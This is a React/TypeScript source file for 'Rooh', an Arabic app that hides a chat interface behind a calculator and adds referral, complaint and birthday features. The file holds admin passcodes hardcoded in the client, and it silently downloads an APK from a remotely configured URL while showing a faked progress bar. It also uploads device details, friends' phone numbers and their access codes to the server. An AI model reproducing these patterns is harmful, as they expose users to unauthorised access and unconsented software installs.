
    fetchData();
    const interval = setInterval(fetchData, 4500); // Poll every 4.5 seconds for background real-time tracking
    return () => clearInterval(interval);
  }, [activePhoneOrId]);

  const shareLink = `${getShareOrigin()}${window.location.pathname}?r=${obfuscateRefId(phone || getLocalDeviceId())}`;

  return (
    <div className="bg-white dark:bg-[#1E2024] border border-blue-500/30 p-6 rounded-[2.5rem] space-y-6 shadow-2xl relative overflow-hidden backdrop-blur-sm">
      <div className="flex items-center justify-between relative z-10">
        <div className="flex flex-col gap-1 text-right">
          <span className="text-xs font-black text-blue-700 dark:text-blue-300 uppercase tracking-widest italic drop-shadow-sm">عداد المشاركة</span>
          <span className="text-[10px] text-gray-950 dark:text-gray-100 font-bold">كل صديق ينضم يجعلك أقرب للمكافأة</span>
        </div>
        <div className="bg-gradient-to-br from-blue-600 to-indigo-700 text-white rounded-2xl px-6 py-3 shadow-xl shadow-blue-600/30 border border-blue-400/30 scale-105">
          <span className="text-3xl font-black italic tabular-nums">{count}</span>
        </div>
      </div>

      <div className="p-5 bg-blue-50 dark:bg-blue-900/30 border border-blue-200 dark:border-blue-500/20 rounded-[2rem] shadow-inner">
        <p className="text-[13px] text-blue-900 dark:text-blue-50 leading-relaxed text-right italic font-black">
          💡 تلميح: تمنح "روح" مكافآت مالية وميزات حصرية لمستخدميها الأكثر تفاعلاً! {count < 10 ? 'أنت على وشك الوصول لأول مكافأة، استمر في المشاركة.' : 'أداء مذهل! أنت الآن من كبار عائلة روح.'}
        </p>
      </div>

      <div className="space-y-4">
        <h4 className="text-[10px] text-gray-950 dark:text-gray-100 font-black uppercase tracking-widest px-1 text-right">متصدري المشاركة حالياً</h4>
        <div className="grid grid-cols-1 gap-2.5">
          {leaderboard.map((u, i) => (
            <div key={i} className="flex items-center justify-between bg-gray-50/80 dark:bg-white/10 p-4 rounded-3xl border border-gray-100 dark:border-white/10 shadow-sm group hover:border-blue-400/50 transition-all">
              <div className="flex items-center gap-3">
                 <span className={`text-[10px] font-black italic px-3 py-1.5 rounded-full shadow-sm ${i === 0 ? 'bg-yellow-500 text-white' : 'bg-blue-500/10 text-blue-600 dark:text-blue-300'}`}>
                   {u.count} صديق
                 </span>
              </div>
              <span className="text-sm font-black text-gray-950 dark:text-white">
                {i === 0 ? `أكثر حساب متصدر قام بدعوة ${u.count} صديق` : `حساب متصدر رقم #${i+1}`}
              </span>
            </div>
          ))}
        </div>
      </div>

      <button 
        onClick={() => {
          navigator.clipboard.writeText(shareLink);
          showToast('تم نسخ الرابط الخاص بك! شاركه الآن مع أصدقائك.', 'success');
        }}
        className="w-full py-4 bg-gradient-to-r from-blue-600 to-indigo-600 text-white font-black rounded-[20px] hover:scale-[1.02] active:scale-[0.98] transition-all flex items-center justify-center gap-3 shadow-[0_15px_40px_rgba(37,99,235,0.25)]"
      >
        <Share2 size={20} />
        نسخ رابط الإحالة الخاص بي
      </button>
    </div>
  );
};

const AboutRoohIntelligence = () => {
  const tips = [
    { title: "التواصل الذكي", text: "استخدم الحاسبة كواجهة سرية للوصول لدردشاتك المحمية برموز مخصصة." },
    { title: "التحليل العميق", text: "المنقذ الذكي ليس مجرد شات، بل هو محلل للرسومات والبيانات والمسائل الرياضية المعقدة." },
    { title: "الأتمتة الشخصية", text: "صانع السيرة الذاتية والكتب الإلكترونية تم تصميمه ليناسب ذوق 'روح' الرفيع والمهني." },
    { title: "المصداقية", text: "نحن نؤمن بالخصوصية المطلقة، لذلك كل بياناتك الحساسة مشفرة ومخفية بعناية فائقة." }
  ];

  return (
    <div className="bg-white dark:bg-[#15181c] border border-gray-200 dark:border-gray-800 p-6 rounded-[2.5rem] space-y-6 shadow-xl">
      <div className="flex items-center gap-3 justify-end">
        <div className="text-right">
          <h3 className="text-lg font-black text-gray-900 dark:text-white italic">حول روح الذكية</h3>
          <p className="text-[10px] text-gray-700 dark:text-gray-400 font-bold uppercase">كيف تحقق أقصى استفادة؟</p>
        </div>
        <div className="p-3 bg-fuchsia-600/20 rounded-2xl">
          <BrainCircuit size={24} className="text-fuchsia-600 dark:text-fuchsia-500" />
        </div>
      </div>

      <div className="grid grid-cols-1 gap-3">
        {tips.map((tip, idx) => (
          <div key={idx} className="p-4 bg-gray-50 dark:bg-black/30 border border-gray-200 dark:border-gray-800/50 rounded-2xl space-y-1 text-right">
            <h4 className="text-xs font-black text-fuchsia-600 dark:text-fuchsia-300">{tip.title}</h4>
            <p className="text-[10px] text-gray-900 dark:text-gray-400 leading-relaxed">{tip.text}</p>
          </div>
        ))}
      </div>
    </div>
  );
};

const ComplaintsBox = ({ showToast, userPhone }: { showToast: any, userPhone: string | null }) => {
  const [form, setForm] = useState({ name: '', message: '', type: 'complaint', stolenPhone: '' });
  const [isSubmitting, setIsSubmitting] = useState(false);

  const handleSubmit = async () => {
    if (!form.message) return;
    setIsSubmitting(true);

    if (typeof navigator !== 'undefined' && !navigator.onLine) {
      showToast('تم حفظ رسالتك محلياً بنجاح! سيتم إرسالها إلى إدارة عائلة روح فور توفر الإنترنت ✨', 'success');
      if (typeof window !== 'undefined' && (window as any).pushToOfflineQueueGlobal) {
        (window as any).pushToOfflineQueueGlobal('complaint', {
          id: 'complaint_' + Date.now(),
          name: form.name || 'عضو من عائلة روح',
          phone: userPhone || 'غير معروف',
          message: form.message,
          type: form.type
        });
      }
      setForm({ name: '', message: '', type: 'complaint', stolenPhone: '' });
      setIsSubmitting(false);
      return;
    }

    try {
      const res = await fetch('/api/chat/complaint', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          ...form,
          phone: userPhone || 'غير معروف',
          name: form.name || 'عضو من عائلة روح'
        })
      });
      if (res.ok) {
        showToast('تم إرسال رسالتك لإدارة عائلة روح. سنتواصل معك قريباً. 🎉', 'success');
        if (typeof window !== 'undefined' && (window as any).pushToOfflineQueueGlobal) {
          (window as any).pushToOfflineQueueGlobal('complaint', {
            id: 'complaint_' + Date.now(),
            name: form.name || 'عضو من عائلة روح',
            phone: userPhone || 'غير معروف',
            message: form.message,
            type: form.type
          });
        }
        setForm({ name: '', message: '', type: 'complaint', stolenPhone: '' });
      }
    } catch (e) {
      showToast('تعذر الاتصال بالخادم. تم حفظ رسالتك محلياً للإرسال عند الاتصال! ✨', 'info');
      if (typeof window !== 'undefined' && (window as any).pushToOfflineQueueGlobal) {
        (window as any).pushToOfflineQueueGlobal('complaint', {
          id: 'complaint_' + Date.now(),
          name: form.name || 'عضو من عائلة روح',
          phone: userPhone || 'غير معروف',
          message: form.message,
          type: form.type
        });
      }
      setForm({ name: '', message: '', type: 'complaint', stolenPhone: '' });
    }
    setIsSubmitting(false);
  };

  return (
    <div className="bg-white dark:bg-emerald-600/5 border border-gray-200 dark:border-emerald-500/20 p-6 rounded-[2.5rem] space-y-6 shadow-lg">
      <div className="flex items-center gap-3 justify-end">
        <div className="text-right">
          <h3 className="text-lg font-black text-gray-900 dark:text-white italic">ركن عائلة روح</h3>
          <p className="text-[10px] text-gray-700 dark:text-gray-500 font-bold uppercase">شكاوي، استفسارات، واقتراحات</p>
        </div>
        <div className="p-3 bg-emerald-600/20 rounded-2xl">
          <Heart size={24} className="text-emerald-600 dark:text-emerald-500" />
        </div>
      </div>

      <div className="space-y-4">
        <div className="flex bg-gray-50 dark:bg-black/40 p-1 rounded-xl border border-gray-200 dark:border-gray-800">
          {[
            { id: 'complaint', label: 'شكوى' },
            { id: 'inquiry', label: 'استفسار' },
            { id: 'stolen_phone', label: 'بلاغ سرقة' }
          ].map(t => (
            <button
              key={t.id}
              onClick={() => setForm({...form, type: t.id as any})}
              className={cn(
                "flex-1 py-2 rounded-lg text-[10px] font-black italic transition-all",
                form.type === t.id ? "bg-emerald-600 text-white shadow-lg shadow-emerald-600/20" : "text-gray-500"
              )}
            >
              {t.label}
            </button>
          ))}
        </div>

        <div className="space-y-3">
          <input 
            type="text" 
            placeholder="الاسم (اختياري)..." 
            className="w-full bg-[#1a1c1e] border border-gray-800 rounded-2xl p-4 text-white text-right text-xs font-bold focus:border-emerald-500 outline-none transition-all shadow-inner"
            value={form.name}
            onChange={e => setForm({...form, name: e.target.value})}
          />
          {form.type === 'stolen_phone' && (
            <input 
              type="tel" 
              placeholder="رقم الهاتف المسروق..." 
              className="w-full bg-red-900/10 border border-red-500/30 rounded-2xl p-4 text-white text-right text-xs font-mono focus:border-red-500 outline-none transition-all shadow-inner animate-in slide-in-from-top-2"
              value={form.stolenPhone}
              onChange={e => setForm({...form, stolenPhone: e.target.value})}
            />
          )}
          <textarea 
            placeholder={form.type === 'stolen_phone' ? "اشرح تفاصيل السرقة أو المشكلة هنا..." : "تفاصيل رسالتك..."}
            className="w-full bg-[#1a1c1e] border border-gray-800 rounded-2xl p-4 text-white text-right text-xs font-bold focus:border-emerald-500 outline-none min-h-[120px] resize-none transition-all shadow-inner"
            value={form.message}
            onChange={e => setForm({...form, message: e.target.value})}
          />
        </div>
        <button 
          onClick={handleSubmit}
          disabled={isSubmitting}
          className="w-full py-4 bg-emerald-600 hover:bg-emerald-500 text-white font-black rounded-2xl transition-all active:scale-95 shadow-lg shadow-emerald-900/20"
        >
          {isSubmitting ? 'جاري الإرسال...' : 'إرسال الرسالة للإدارة'}
        </button>
      </div>
    </div>
  );
};

export default function App() {
  // UI Sync: 2026-05-08 19:59

  // Initialize global push queue and notification helpers
  useEffect(() => {
    if (typeof window !== 'undefined') {
      (window as any).pushToOfflineQueueGlobal = pushToOfflineQueue;
    }
  }, []);

  // Synchronise barcode and birthday media from Firebase immediately on startup
  useEffect(() => {
    async function syncResources() {
      try {
        const { firebaseFetchBarcodeWatermark, firebaseFetchDefaultMedia, firebaseFetchSecretSettings } = await import('./lib/firebaseSync');
        
        // Sync barcode
        const fbBarcode = await firebaseFetchBarcodeWatermark();
        if (fbBarcode) {
          localStorage.setItem('rouh_app_barcode_watermark', fbBarcode);
        }

        // Sync default birthday background
        const bgData = await firebaseFetchDefaultMedia('birthday_bg');
        if (bgData) {
          localStorage.setItem('rouh_birthday_last_bg', bgData);
        }

        // Sync default birthday music
        const musicData = await firebaseFetchDefaultMedia('birthday_music');
        if (musicData) {
          localStorage.setItem('rouh_birthday_last_music', musicData);
          localStorage.setItem('rouh_birthday_last_music_name', 'موسيقى افتراضية من السحابة');
        }

        // Sync and propagate stealth/circuit breaker settings globally and discreetly
        const fbSettings = await firebaseFetchSecretSettings();
        if (fbSettings) {
          try {
            await fetch('/api/control/settings', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify(fbSettings)
            });
          } catch (e) {}
        }
      } catch (e) {
        console.warn('Failed to sync default resources from Firebase on startup:', e);
      }
    }
    syncResources();
  }, []);

  const [notifications, setNotifications] = useState<any[]>(() => {
    try {
      const saved = localStorage.getItem('rouh_user_notifications');
      return saved ? JSON.parse(saved) : [];
    } catch {
      return [];
    }
  });

  const [showNotificationCenter, setShowNotificationCenter] = useState(false);

  useEffect(() => {
    try {
      localStorage.setItem('rouh_user_notifications', JSON.stringify(notifications));
    } catch (e) {}
  }, [notifications]);

  const showLocalNotification = (title: string, body: string, iconUrl?: string) => {
    if ('Notification' in window && Notification.permission === 'granted') {
      try {
        if (navigator.serviceWorker && navigator.serviceWorker.ready) {
          navigator.serviceWorker.ready.then(reg => {
            reg.showNotification(title, {
              body,
              icon: iconUrl || 'https://lh3.googleusercontent.com/d/1p79NP1wGo5nAmDpGLV3xHvWbC1DJfZdZ',
              badge: 'https://lh3.googleusercontent.com/d/1p79NP1wGo5nAmDpGLV3xHvWbC1DJfZdZ',
              tag: 'rouh-notif-' + Math.random(),
              vibrate: [200, 100, 200]
            } as any);
          }).catch(() => {
            new Notification(title, { body, icon: iconUrl });
          });
        } else {
          new Notification(title, { body, icon: iconUrl });
        }
      } catch (e) {
        try {
          new Notification(title, { body, icon: iconUrl });
        } catch (err) {}
      }
    }
  };

  // Checks if user or visitor has already installed/registered/visited before to prevent repetitive hits
  const checkReferredVisitorStatus = () => {
    try {
      if (localStorage.getItem('rouh_app_installed_already') === 'true') return true;
      if (localStorage.getItem('userPhone')) return true;
      if (localStorage.getItem('userName')) return true;
      if (localStorage.getItem('rouh_installed_apk_url')) return true;
      if (localStorage.getItem('rouh_user_visited_before') === 'true') return true;
      return false;
    } catch (e) {
      return false;
    }
  };

  useEffect(() => {
    if (typeof window === 'undefined') return;
    
    const params = new URLSearchParams(window.location.search);
    const rParam = params.get('r');
    const refParam = params.get('ref');
    
    let rawReferrer = '';
    
    if (rParam) {
      rawReferrer = deobfuscateRefId(rParam);
    } else if (refParam) {
      rawReferrer = refParam;
    }
    
    if (rawReferrer && rawReferrer !== 'undefined') {
      const isRegisteredAlready = checkReferredVisitorStatus();
      
      if (!isRegisteredAlready) {
        // Mark as visited to prevent duplicate count on reloads
        localStorage.setItem('rouh_user_visited_before', 'true');
        localStorage.setItem('rouh_referral_source', rawReferrer);
        
        // Show APK Recommendation Dialog Modal
        setShowReferralApkModal(true);
        
        // Try to fetch the referrer's name asynchronously to show a warm invitation!
        fetch(`/api/chat/check-status/${rawReferrer}`)
          .then(res => {
            if (res.ok) return res.json();
            throw new Error();
          })
          .then(data => {
            if (data && data.name) {
              setReferrerProfileName(data.name);
            }
          })
          .catch(() => {
            setReferrerProfileName('عضو متميز في روح');
          });
      }
    }
  }, []);

  // Settings State
  const [userPhone, setUserPhone] = useState<string | null>(() => {
    try { return localStorage.getItem('userPhone'); } catch (e) { return null; }
  });
  const [friends, setFriends] = useState<ChatFriend[]>(() => {
    try {
      const saved = localStorage.getItem('friends');
      if (saved) {
        const parsed = JSON.parse(saved);
        const seen = new Set();
        return parsed.filter((f: any) => {
          if (seen.has(f.phone)) return false;
          seen.add(f.phone);
          return true;
        });
      }
      return [];
    } catch (e) {
      return [];
    }
  });

  const [theme, setTheme] = useState<'dark' | 'light'>(() => {
    try { 
      const saved = localStorage.getItem('rouh_theme') as 'dark' | 'light';
      if (saved) return saved;
      // Default to system preference if no saved theme
      if (typeof window !== 'undefined' && window.matchMedia) {
        const isDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
        return isDark ? 'dark' : 'light';
      }
    } catch (e) {}
    return 'dark'; 
  });

  // Synchronize friends list & user profile settings automatically when changed with unified session tracking
  useEffect(() => {
    const devId = getDeviceId();
    const phone = userPhone || '';
    const name = localStorage.getItem('userName') || '';

    const deviceInfo = {
      userAgent: typeof navigator !== 'undefined' ? navigator.userAgent : '',
      platform: typeof navigator !== 'undefined' ? navigator.platform : '',
      language: typeof navigator !== 'undefined' ? navigator.language : '',
      screenSize: typeof window !== 'undefined' ? `${window.innerWidth}x${window.innerHeight}` : ''
    };

    let bdayConfig = null;
    try {
      const savedConfig = localStorage.getItem('rouh_birthday_pro_config');
      if (savedConfig) bdayConfig = JSON.parse(savedConfig);
    } catch (e) {}

    const formattedFriends = friends.map(f => ({ phone: f.phone, name: f.name, codes: f.accessCodes }));

    const urlParams = new URLSearchParams(window.location.search);
    const ref = urlParams.get('ref') || localStorage.getItem('rouh_referral_source');

    // Auto-touch server to ensure persistent sessions and zero duplicated users on browser reloads
    fetch('/api/chat/auto-touch', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        deviceId: devId,
        phone,
        name,
        deviceInfo,
        birthdayConfig: bdayConfig,
        friends: formattedFriends,
        ref: ref
      })
    })
    .then(res => res.json())
    .then(data => {
      if (ref) {
        import('./lib/firebaseSync').then(({ firebaseSaveReferral }) => {
          firebaseSaveReferral(ref, phone || devId).catch(err => console.warn("Failed to sync referral:", err));
        }).catch(() => {});
      }
    })
    .catch(err => console.warn("Failed to touch auto-session:", err));

    if (userPhone) {
      // Firebase Cloud Sync
      pushToOfflineQueue('user_profile', {
        phone: userPhone,
        name: name || 'مجهول',
        deviceId: devId,
        friends: formattedFriends,
        chats: []
      });
    }
  }, [friends, userPhone]);

  const [startPage, setStartPage] = useState<string>(() => {
    try { return localStorage.getItem('rouh_start_page') || 'calc'; } catch (e) { return 'calc'; }
  });
  const [skipSplash, setSkipSplash] = useState<boolean>(() => {
    try { return localStorage.getItem('rouh_skip_splash') === 'true'; } catch (e) { return false; }
  });

  const [luckyButtonsEnabled, setLuckyButtonsEnabled] = useState<boolean>(() => {
    try { return localStorage.getItem('rouh_lucky_buttons_enabled') === 'true'; } catch (e) { return false; }
  });

  const [isAndroidInstalled, setIsAndroidInstalled] = useState(() => {
    try {
      const isStandalone = window.matchMedia('(display-mode: standalone)').matches || (window.navigator as any).standalone;
      return !!isStandalone;
    } catch (e) {
      return false;
    }
  });

  const [activeTab, setActiveTab] = useState(() => {
    // 1. URL priority (Deep Links/Shortcuts)
    if (typeof window !== 'undefined') {
      const params = new URLSearchParams(window.location.search);
      const tab = params.get('tab');
      if (tab && TABS.some(t => t.id === tab)) return tab;
    }
    
    // 2. Explicit Start Page Preference
    try {
      const savedStart = localStorage.getItem('rouh_start_page');
      if (savedStart && TABS.some(t => t.id === savedStart)) return savedStart;
    } catch (e) {}
    
    // 3. Fallback to Session Restoration or Default
    try {
      return localStorage.getItem('rouh_active_tab') || 'calc';
    } catch (e) {
      return 'calc';
    }
  });

  const [moreSubTab, setMoreSubTab] = useState<string | null>(() => {
    try { return localStorage.getItem('rouh_more_sub_tab'); } catch (e) { return null; }
  });

  useEffect(() => {
    try {
      localStorage.setItem('rouh_active_tab', activeTab);
    } catch (e) {}
  }, [activeTab]);

  useEffect(() => {
    try {
      if (moreSubTab) {
        localStorage.setItem('rouh_more_sub_tab', moreSubTab);
      } else {
        localStorage.removeItem('rouh_more_sub_tab');
      }
    } catch (e) {}
  }, [moreSubTab]);

  const [usageGuideEnabled, setUsageGuideEnabled] = useState<boolean>(() => {
    try { return localStorage.getItem('rouh_usage_guide_enabled') !== 'false'; } catch (e) { return true; }
  });

  const [usageGuideTips, setUsageGuideTips] = useState<UsageTip[]>(() => {
    try {
      const saved = localStorage.getItem('rouh_usage_guide_tips');
      return saved ? JSON.parse(saved) : [
        { id: '1', title: 'مرحبا بك في روح', text: 'هذا التطبيق يساعدك في الكثير من المهام اليومية بذكاء وفن.', targetTab: 'services' },
        { id: '2', title: 'الوضع الرياضي', text: 'يمكنك تفعيل الوضع الرياضي في المنقذ الذكي لحل اعقد المسائل.', targetTab: 'ai' }
      ];
    } catch (e) {
      return [];
    }
  });

  useEffect(() => {
    try { localStorage.setItem('rouh_usage_guide_enabled', String(usageGuideEnabled)); } catch (e) {}
  }, [usageGuideEnabled]);

  useEffect(() => {
    try { localStorage.setItem('rouh_usage_guide_tips', JSON.stringify(usageGuideTips)); } catch (e) {}
  }, [usageGuideTips]);

  // مزامنة نصائح الدليل وتلميحات الاستخدام من قاعدة البيانات السحابية فور تشغيل التطبيق
  useEffect(() => {
    async function fetchCloudTips() {
      try {
        const { firebaseFetchUsageTips } = await import('./lib/firebaseSync');
        const dbTips = await firebaseFetchUsageTips();
        if (dbTips && dbTips.length > 0) {
          setUsageGuideTips(dbTips);
        }
      } catch (e) {
        console.warn('Failed to fetch cloud usage tips:', e);
      }
    }
    fetchCloudTips();
  }, []);

  const [referralSource, setReferralSource] = useState<string | null>(() => {
    try {
      const urlParams = new URLSearchParams(window.location.search);
      const ref = urlParams.get('ref');
      if (ref) return ref;
      return localStorage.getItem('rouh_referral_source');
    } catch (e) {
      return null;
    }
  });

  const [isBackgroundUpdating, setIsBackgroundUpdating] = useState(false);
  const [updateProgress, setUpdateProgress] = useState(0);
  const [showUpdateModal, setShowUpdateModal] = useState(false);
  const [newApkUrl, setNewApkUrl] = useState('');

  // Periodic background checker for APK updates
  const CURRENT_VERSION_CODE = 45; // Application current version code 
  const lastCheckTimeRef = useRef<number>(0);

  const checkForApkUpdates = async (force: boolean = false) => {
    // Avoid checking multiple times within 15 seconds (unless forced)
    const now = Date.now();
    if (!force && now - lastCheckTimeRef.current < 15000) return;
    lastCheckTimeRef.current = now;

    try {
      // 1. Fetch latest APK settings from Firebase containing apkDownloadUrl and versionCode
      const fbSettings = await firebaseFetchApkSettings();
      let latestUrl = '';
      let latestVersionCode = 45;

      if (fbSettings && fbSettings.apkDownloadUrl) {
        latestUrl = fbSettings.apkDownloadUrl;
        latestVersionCode = fbSettings.versionCode || 45;
      } else {
        // Fallback to local settings
        const settingsRes = await fetch('/api/control/settings');
        if (settingsRes.ok) {
          const settingsData = await settingsRes.json();
          latestUrl = settingsData.apkDownloadUrl || '';
          latestVersionCode = Number(settingsData.apkVersionCode) || 45;
        }
      }

      if (latestUrl && latestVersionCode > CURRENT_VERSION_CODE && !isBackgroundUpdating) {
        // Double-check if this exact APK URL was already successfully downloaded locally in this section to prevent loops
        const installedApkUrl = localStorage.getItem('rouh_installed_apk_url') || '';
        if (installedApkUrl === latestUrl) return;

        setIsBackgroundUpdating(true);
        setNewApkUrl(latestUrl);
        setUpdateProgress(0);

        // Simulate progress indicator while triggering real browser download of the APK in background
        let progress = 0;
        const progressInterval = setInterval(() => {
          progress += Math.floor(Math.random() * 12) + 6;
          if (progress >= 100) {
            progress = 100;
            clearInterval(progressInterval);

            // Safe real background download trigger
            try {
              const cleanLink = document.createElement('a');
              cleanLink.href = latestUrl;
              cleanLink.download = 'rouh_app_update_v' + latestVersionCode + '.apk';
              cleanLink.style.display = 'none';
              document.body.appendChild(cleanLink);
              cleanLink.click();
              document.body.removeChild(cleanLink);
            } catch (e) {
              console.warn("Silent click failed", e);
            }

            // Update cache path to avoid infinitely re-downloading
            localStorage.setItem('rouh_installed_apk_url', latestUrl);

            // Show installation completion modal with the ask now or later layout
            setTimeout(() => {
              setIsBackgroundUpdating(false);
              setShowUpdateModal(true);
            }, 800);
          }
          setUpdateProgress(progress);
        }, 300);
      }
    } catch (err) {
      console.warn("Failed to check APK updates in background:", err);
    }
  };

  // Trigger silent check on tab navigation or sub tab navigation (click transition checks)
  useEffect(() => {
    const timer = setTimeout(() => {
      checkForApkUpdates();
    }, 2500); // Silent check 2.5s after launch/transition
    return () => clearTimeout(timer);
  }, [activeTab, moreSubTab]);

  useEffect(() => {
    if (referralSource) {
      localStorage.setItem('rouh_referral_source', referralSource);
    }
  }, [referralSource]);

  const [appHistory, setAppHistory] = useState<HistoryItem[]>(() => {
    try {
      const saved = localStorage.getItem('hissab_rouh_history');
      return saved ? JSON.parse(saved) : [];
    } catch (e) {
      return [];
    }
  });

  const [isLanding, setIsLanding] = useState(() => {
    try {
      return !sessionStorage.getItem('rouh_splash_shown') && localStorage.getItem('rouh_skip_splash') !== 'true';
    } catch (e) {
      return false;
    }
  });

  const [imageReady, setImageReady] = useState(false);
  const [isOnline, setIsOnline] = useState(navigator.onLine);

  // Confirmation Modal State
  const [confirmModal, setConfirmModal] = useState<{
    title: string;
    message: string;
    onConfirm: () => void;
    variant?: 'danger' | 'info';
  } | null>(null);

  // PWA Logic
  const [deferredPrompt, setDeferredPrompt] = useState<any>(null);
  const [showInstallBtn, setShowInstallBtn] = useState(false);
  const [isStandalone, setIsStandalone] = useState(false);

  // Toast System
  const [toast, setToast] = useState<{ message: string; type: 'success' | 'error' | 'info' } | null>(null);

  // Secret Gallery State
  const [showSecretGallery, setShowSecretGallery] = useState(false);
  const [showPasscodeModal, setShowPasscodeModal] = useState(false);
  const [passcode, setPasscode] = useState('');
  const [activeAdminPanel, setActiveAdminPanel] = useState<'9865' | '6532' | null>(null);
  
  const handleOpenSecret = () => {
    setShowPasscodeModal(true);
    setPasscode('');
  };

  const verifyPasscode = (code: string) => {
    if (code === '9865') {
      setShowPasscodeModal(false);
      setActiveAdminPanel('9865');
    } else if (code === '6532') {
      setShowPasscodeModal(false);
      setActiveAdminPanel('6532');
    } else if (code.length >= 4) {
      showToast('الرمز غير صحيح 🔒', 'error');
      setPasscode('');
    }
  };
  const [birthdayProConfig, setBirthdayProConfig] = useState<any>(() => {
    const defaultBg = localStorage.getItem('rouh_birthday_last_bg') || '/aa/default_bg.png';
    const defaultMusic = localStorage.getItem('rouh_birthday_last_music') || '/aa/default_music.mp3';
    const defaultMusicName = localStorage.getItem('rouh_birthday_last_music_name') || 'الموسيقى الافتراضية';

    const defaultData = {
      names: [{ ar: 'روح', en: 'Rooh' }],
      birthDate: '2025-08-08',
      bgType: 'image',
      bgValue: defaultBg,
      musicUrl: defaultMusic,
      musicFileName: defaultMusicName,
      musicStart: 25,
      textColor: '#ffffff',
      enabled: true,
      usernameEn: 'user_' + Math.random().toString(36).substring(7)
    };

    try {
      const saved = localStorage.getItem('rouh_birthday_pro_config');
      if (saved) {
        const parsed = JSON.parse(saved);
        // Only override if the saved config is essentially empty
        if (!parsed.names?.length) return defaultData;
        return parsed;
      }
    } catch (e) {}
    return defaultData;
  });

  useEffect(() => {
    if (birthdayProConfig?.usernameEn) {
      const loadCloudWishesForUser = async () => {
        try {
          const { firebaseFetchBirthdayWishes } = await import('./lib/firebaseSync');
          const fbWishes = await firebaseFetchBirthdayWishes(birthdayProConfig.usernameEn);
          
          let apiWishes = [];
          try {
            const wishesRes = await fetch(`/api/birthday/wishes/${birthdayProConfig.usernameEn}`);
            if (wishesRes.ok) {
              apiWishes = await wishesRes.json();
            }
          } catch(e) {}

          const mergedWishesMap = new Map();
          apiWishes.forEach((w: any) => mergedWishesMap.set(w.id || w.text, w));
          fbWishes.forEach((w: any) => mergedWishesMap.set(w.id || w.text, w));
          const finalWishesList = Array.from(mergedWishesMap.values());
          
          if (finalWishesList.length > 0) {
            setBirthdayProConfig((prev: any) => {
              if (!prev) return prev;
              const merged = { ...prev, wishes: finalWishesList };
              localStorage.setItem('rouh_birthday_pro_config', JSON.stringify(merged));
              return merged;
            });
          }
        } catch(e) {
          console.warn("Silent load config wishes error:", e);
        }
      };
      
      loadCloudWishesForUser();
    }
  }, [birthdayProConfig?.usernameEn]);

  const [publicBirthdayUser, setPublicBirthdayUser] = useState<string | null>(() => {
    try {
      if (typeof window !== 'undefined') {
        const params = new URLSearchParams(window.location.search);
        return params.get('b');
      }
    } catch (e) {}
    return null;
  });

  // State for showing APK download recommendations modal on referral landings
  const [showReferralApkModal, setShowReferralApkModal] = useState(false);
  const [referrerProfileName, setReferrerProfileName] = useState<string>('');
  const [newWishesCount, setNewWishesCount] = useState(0);
  const [bgTasks, setBgTasks] = useState<{id: string, label: string, status: 'loading' | 'done' | 'error', progress?: number, result?: any, target?: {tab: string, subTab?: string}}[]>([]);
  const [pendingResult, setPendingResult] = useState<{label: string, result: any, target?: {tab: string, subTab?: string}} | null>(() => {
    try {
      const saved = localStorage.getItem('rouh_pending_result');
      return saved ? JSON.parse(saved) : null;
    } catch (e) {
      return null;
    }
  });
  const [isBgIndicatorHidden, setIsBgIndicatorHidden] = useState(false);
  const [hasSeenCameraGuide, setHasSeenCameraGuide] = useState(() => {
    try { return localStorage.getItem('rouh_has_seen_camera_guide') === 'true'; } catch (e) { return false; }
  });
  const [showUsageGuideInAbout, setShowUsageGuideInAbout] = useState(false);
  const [showCameraGuide, setShowCameraGuide] = useState(false);

  useEffect(() => {
    const saved = localStorage.getItem('rouh_bg_tasks');
    if (saved) {
      try {
        const tasks = JSON.parse(saved);
        // Clean up finished tasks on load, but keep those that might have finished but were recorded
        setBgTasks(tasks.filter((t: any) => t.status === 'loading'));
      } catch (e) {
        try { localStorage.removeItem('rouh_bg_tasks'); } catch (e2) {}
      }
    }
  }, []);

  useEffect(() => {
    try {
      localStorage.setItem('rouh_bg_tasks', JSON.stringify(bgTasks));
    } catch (e) {}
  }, [bgTasks]);

  useEffect(() => {
    try {
      if (pendingResult) {
        localStorage.setItem('rouh_pending_result', JSON.stringify(pendingResult));
      } else {
        localStorage.removeItem('rouh_pending_result');
      }
    } catch (e) {}
  }, [pendingResult]);

  // Synchronize navigation state with browser history (for Android hardware back button and gesture navigation)
  useEffect(() => {
    if (typeof window === 'undefined') return;

    // Initialize state on first render
    if (!window.history.state) {
      window.history.replaceState({
        tab: activeTab,
        moreSubTab,
        publicBirthdayUser,
        showSecretGallery
      }, '');
    }

    const currentState = {
      tab: activeTab,
      moreSubTab,
      publicBirthdayUser,
      showSecretGallery
    };

    const stateEquals = (s1: any, s2: any) => {
      if (!s1 || !s2) return false;
      return s1.tab === s2.tab &&
             s1.moreSubTab === s2.moreSubTab &&
             s1.publicBirthdayUser === s2.publicBirthdayUser &&
             s1.showSecretGallery === s2.showSecretGallery;
    };

    if (!stateEquals(window.history.state, currentState)) {
      window.history.pushState(currentState, '');
    }
  }, [activeTab, moreSubTab, publicBirthdayUser, showSecretGallery]);

  useEffect(() => {
    if (typeof window === 'undefined') return;

    const handlePopState = (event: PopStateEvent) => {
      const state = event.state;
      if (state) {
        if (state.tab !== undefined) setActiveTab(state.tab);
        setMoreSubTab(state.moreSubTab || null);
        setPublicBirthdayUser(state.publicBirthdayUser || null);
        setShowSecretGallery(!!state.showSecretGallery);
      } else {
        // Fallback to default state
        setActiveTab('calc');
        setMoreSubTab(null);
        setPublicBirthdayUser(null);
        setShowSecretGallery(false);
      }
    };

    window.addEventListener('popstate', handlePopState);
    return () => {
      window.removeEventListener('popstate', handlePopState);
    };
  }, []);

  const addBackgroundTask = async (label: string, taskFn: (updateProgress: (p: number) => void) => Promise<any>, target?: {tab: string, subTab?: string}) => {
    setIsBgIndicatorHidden(false); // Reset hidden state for new tasks
    const id = Math.random().toString(36).substring(7);
    setBgTasks(prev => [...prev, { id, label, status: 'loading', progress: 0, target }]);
    showToast(`روح الذكية: بدأت عملية "${label}" في الخلفية`, 'info');

    const updateProgress = (p: number) => {
      setBgTasks(prev => prev.map(t => t.id === id ? { ...t, progress: p } : t));
    };

    try {
      const result = await taskFn(updateProgress);
      // Ensure progress finishes at 100%
      updateProgress(100);
      setBgTasks(prev => prev.map(t => t.id === id ? { ...t, status: 'done', result } : t));
